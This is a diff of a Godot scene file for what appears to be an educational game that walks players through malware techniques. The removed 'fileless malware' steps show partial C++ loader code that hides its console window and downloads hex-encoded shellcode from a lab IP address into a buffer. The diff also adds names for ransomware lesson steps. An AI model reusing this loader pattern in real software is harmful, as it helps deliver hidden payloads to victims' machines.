-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.025, 1.97), Vector2(0.025, 0.425)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [6.999999999999998]
-}
-
-[sub_resource type="Animation" id="Animation_pwtf5"]
-resource_name = "fileless_7"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 3: BOILERPLATE"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["That line takes the text you downloaded from the server, turns it into a C-style string, and stores its starting memory address in memBuffer so the program can read through it."]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["#include <iostream>
-#include <cpr/cpr.h>
-#include <windows.h>
-
-int main() {
-	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.56.102/home\" });
-	char* memBuffer = NULL;
-	memBuffer = (char *)r.text.c_str(); 
-	
-	unsigned char shellcode[382]; 
-	memBuffer += 2; 
-	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
-		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
-		memBuffer = memBuffer + 4;
-	}"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(3.715, 3.415), Vector2(2.785, 0.71)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.025, 0.425), Vector2(0.025, 0.425)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [6.999999999999998]
-}
-
-[sub_resource type="Animation" id="Animation_i1bj2"]
-resource_name = "fileless_8"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 3: BOILERPLATE"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["That line takes the text you downloaded from the server, turns it into a C-style string, and stores its starting memory address in memBuffer so the program can read through it."]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["#include <iostream>
-#include <cpr/cpr.h>
-#include <windows.h>
-
-int main() {
-	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.56.102/home\" });
-	char* memBuffer = NULL;
-	memBuffer = (char *)r.text.c_str(); 
-	
-	unsigned char shellcode[382]; 
-	memBuffer += 2; 
-	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
-		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
-		memBuffer = memBuffer + 4;
-	}"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(2.555, 0.415), Vector2(1.64, 0.35)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.025, 1.315), Vector2(0.025, 1.68)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [6.999999999999998]
-}
-
-[sub_resource type="Animation" id="Animation_nteir"]
-resource_name = "fileless_9"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["STEP 3: BOILERPLATE"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["This loop reads each pair of hex characters from memBuffer, converts them into real bytes stored in shellcode[count], then moves the pointer forward to process the next byte."]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["#include <iostream>
-#include <cpr/cpr.h>
-#include <windows.h>
-
-int main() {
-	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.56.102/home\" });
-	char* memBuffer = NULL;
-	memBuffer = (char *)r.text.c_str(); 
-	
-	unsigned char shellcode[382]; 
-	memBuffer += 2; 
-	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
-		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
-		memBuffer = memBuffer + 4;
-	}"]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(1.64, 0.35), Vector2(3.7, 1.865)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0, 1),
-"transitions": PackedFloat32Array(1, 1),
-"update": 0,
-"values": [Vector2(0.025, 1.68), Vector2(0.025, 1.98)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [6.999999999999998]
 }
 
 [sub_resource type="AnimationLibrary" id="AnimationLibrary_de0th"]
 _data = {
-&"fileless_01": SubResource("Animation_q0tlf"),
-&"fileless_02": SubResource("Animation_yvlyr"),
-&"fileless_03": SubResource("Animation_rvh2y"),
-&"fileless_04": SubResource("Animation_krri1"),
-&"fileless_05": SubResource("Animation_e02ds"),
-&"fileless_06": SubResource("Animation_33oqg"),
-&"fileless_07": SubResource("Animation_pwtf5"),
-&"fileless_08": SubResource("Animation_i1bj2"),
-&"fileless_09": SubResource("Animation_nteir"),
-&"fileless_10": SubResource("Animation_avoq8"),
-&"fileless_11": SubResource("Animation_7q661"),
-&"fileless_12": SubResource("Animation_4xa5g"),
-&"fileless_13": SubResource("Animation_fisl7"),
-&"fileless_14": SubResource("Animation_sb7b7"),
-&"fileless_15": SubResource("Animation_jsba4"),
-&"fileless_16": SubResource("Animation_72txf"),
-&"fileless_17": SubResource("Animation_35c0o"),
-&"fileless_18": SubResource("Animation_fwrof")
+&"RESET": SubResource("Animation_i7g13"),
+&"ransomware_step_01": SubResource("Animation_oekl0"),
+&"ransomware_step_02": SubResource("Animation_k4s4l"),
+&"ransomware_step_03": SubResource("Animation_xwue7"),
+&"ransomware_step_04": SubResource("Animation_cxtjw"),
+&"ransomware_step_05": SubResource("Animation_wf7ls"),
+&"ransomware_step_06": SubResource("Animation_vuf0p"),
+&"ransomware_step_07": SubResource("Animation_gu46y"),
+&"ransomware_step_08": SubResource("Animation_de0th"),
+&"ransomware_step_09": SubResource("Animation_31cwg"),
+&"ransomware_step_10": SubResource("Animation_x5n46"),
+&"ransomware_step_11": SubResource("Animation_x2hu1"),
+&"ransomware_step_12": SubResource("Animation_8yhgl"),
+&"ransomware_step_13": SubResource("Animation_h0h0r"),
+&"ransomware_step_14": SubResource("Animation_fkojw")
 }
 
 [sub_resource type="StyleBoxFlat" id="StyleBoxFlat_h8m8q"]
@@ -1666,14 +1897,14 @@ bg_color = Color(0.2303367, 0.44994062, 0.80007863, 1)
 
 [sub_resource type="StyleBoxEmpty" id="StyleBoxEmpty_x5n46"]
 
-[node name="Fileless" type="Control"]
+[node name="CodeEditor" type="Control"]
 layout_mode = 3
 anchors_preset = 15
 anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
-script = ExtResource("1_q0tlf")
+script = ExtResource("1_fliea")
 
 [node name="Background" type="ColorRect" parent="."]
 layout_mode = 1
@@ -1696,7 +1927,7 @@ metadata/_edit_use_anchors_ = true
 
 [node name="Label" type="Label" parent="Header"]
 layout_mode = 2
-theme_override_fonts/font = ExtResource("2_qxdw1")
+theme_override_fonts/font = ExtResource("2_5p0s0")
 text = "VScode"
 
 [node name="Body" type="HBoxContainer" parent="."]
@@ -1726,13 +1957,12 @@ layout_mode = 2
 [node name="FoldableContainer" type="FoldableContainer" parent="Body/ExplanationPanel/VBoxContainer"]
 layout_mode = 2
 theme = SubResource("Theme_x5n46")
-title = "⚠️FILELESS MALWARE⚠️"
+title = "Creating an encryption code"
 
 [node name="RichTextLabel" type="RichTextLabel" parent="Body/ExplanationPanel/VBoxContainer/FoldableContainer"]
 custom_minimum_size = Vector2(0, 531.305)
 layout_mode = 2
 bbcode_enabled = true
-text = "Fileless malware is a stealthy type of malicious software. Instead of installing a file on your computer, it runs entirely in memory using trusted system tools. This makes it hard to detect and allows attackers to steal data or control your computer without leaving obvious traces.."
 
 [node name="CodeContainer" type="VBoxContainer" parent="Body"]
 layout_mode = 2
@@ -1765,7 +1995,6 @@ autowrap_mode = 2
 gutters_draw_line_numbers = true
 
 [node name="Overlay" type="ColorRect" parent="Body/CodeContainer/PanelContainer"]
-visible = false
 material = SubResource("ShaderMaterial_gu46y")
 layout_mode = 2
 mouse_filter = 2
@@ -1775,7 +2004,7 @@ metadata/_edit_use_anchors_ = true
 visible = false
 custom_minimum_size = Vector2(0, 70)
 layout_mode = 2
-theme_override_fonts/normal_font = ExtResource("3_oducy")
+theme_override_fonts/normal_font = ExtResource("3_rwdno")
 theme_override_font_sizes/normal_font_size = 20
 bbcode_enabled = true
 text = "[wave]This is my text"
@@ -1796,7 +2025,7 @@ grow_horizontal = 2
 grow_vertical = 2
 mouse_filter = 2
 color = Color(0, 0, 0, 0.17254902)
-script = ExtResource("4_dsue1")
+script = ExtResource("4_mk2dp")
 
 [node name="Window" type="PanelContainer" parent="WindowBackground"]
 clip_children = 2
@@ -1825,7 +2054,7 @@ theme_override_styles/panel = SubResource("StyleBoxFlat_pkbn6")
 [node name="Button" type="Button" parent="WindowBackground/Window/WindowContents/WindowHeader"]
 layout_mode = 2
 size_flags_horizontal = 8
-theme_override_fonts/font = ExtResource("3_oducy")
+theme_override_fonts/font = ExtResource("3_rwdno")
 theme_override_styles/normal = SubResource("StyleBoxEmpty_cxtjw")
 theme_override_styles/pressed = SubResource("StyleBoxEmpty_wf7ls")
 theme_override_styles/hover = SubResource("StyleBoxEmpty_vuf0p")
@@ -1835,7 +2064,7 @@ text = "X"
 
 [node name="SampleHeader" type="Label" parent="WindowBackground/Window/WindowContents/WindowHeader"]
 layout_mode = 2
-text = "ransomware.exe"
+text = "Wow header"
 
 [node name="MarginContainer" type="MarginContainer" parent="WindowBackground/Window/WindowContents"]
 layout_mode = 2
@@ -1843,7 +2072,6 @@ theme_override_constants/margin_left = 5
 theme_override_constants/margin_right = 5
 
 [node name="SampleContent" type="Label" parent="WindowBackground/Window/WindowContents/MarginContainer"]
-visible = false
 layout_mode = 2
 theme_override_font_sizes/font_size = 31
 text = "Contents"
@@ -1858,7 +2086,7 @@ anchors_preset = 0
 offset_right = 40.0
 offset_bottom = 40.0
 
-[node name="Next" parent="Debug" instance=ExtResource("5_evr5x")]
+[node name="Next" parent="Debug" instance=ExtResource("5_e0kck")]
 layout_mode = 1
 anchor_left = 0.736111
 anchor_top = 0.802469
@@ -1869,7 +2097,7 @@ offset_top = 487.90118
 offset_right = 962.3815
 offset_bottom = 522.6172
 
-[node name="Back" parent="Debug" instance=ExtResource("6_l34d4")]
+[node name="Back" parent="Debug" instance=ExtResource("6_p3rr4")]
 layout_mode = 1
 anchor_left = 0.131944
 anchor_top = 0.802469
